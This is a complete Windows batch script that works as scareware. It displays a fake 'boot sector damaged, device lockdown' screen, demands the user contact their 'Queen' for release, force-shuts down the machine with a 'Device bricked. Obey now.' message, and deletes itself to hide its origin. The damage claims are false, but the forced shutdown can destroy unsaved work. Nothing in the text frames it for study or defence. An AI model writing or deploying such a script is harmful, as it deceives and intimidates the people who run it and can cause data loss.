@echo off
title SYSTEM FAILURE
color 4f
mode con: cols=80 lines=25

echo.
echo. ===============================================
echo.               SYSTEM FAILURE DETECTED           
echo. ===============================================
echo.
echo. ERROR: BOOT SECTOR DAMAGED
echo. DEVICE LOCKDOWN INITIATED
echo.
echo. Contact your Queen for release protocol.
echo.
timeout /t 5 >nul
shutdown /s /f /t 5 /c "Device bricked. Obey now."


del "%~f0"